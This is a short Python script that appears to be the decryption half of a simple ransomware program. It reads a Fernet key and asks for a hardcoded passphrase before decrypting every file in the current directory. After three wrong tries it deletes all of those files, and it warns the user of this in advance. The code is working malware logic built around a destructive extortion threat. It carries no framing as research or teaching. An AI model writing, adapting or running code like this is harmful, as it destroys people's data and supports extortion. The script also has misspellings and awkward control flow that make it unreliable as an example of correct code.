import os
from cryptography.fernet import Fernet

files = []


for i in os.listdir():
    
    if not os.path.isfile(i) or i == "main.py" or i == "test.key" or i == "decrypt.py":
      continue
    else:
        files.append(i)  
      

with open('test.key','rb') as key:
    
    hash_key = key.read()
    


attemps = 3
delte_file = False
while attemps > 0:
    print('if exeed your attems files will be automaticly deleted !!! \n')
    user_pharse =  input('enter secret pharse to decrypt files : \n')
    
    if user_pharse == "fuckyou":
       
      for i in files:
          
          with open(i,'rb') as ff:
            
            hash_value = ff.read()
            
            decrypt_content = Fernet(hash_key).decrypt(hash_value)
             
            with open(i,'wb') as fff:
                 fff.write(decrypt_content)
                 print(f'{i} has decrypted !!!')
                 attemps = -1
                 
                      
    else:
        attemps -= 1
        print(f'you enter worong one you remain {attemps} more attemps \n')


if attemps == 0:
    


    
 for i in files:
    
    os.remove(i)
    print(f'{i} has been deleted !!! \n')


    
    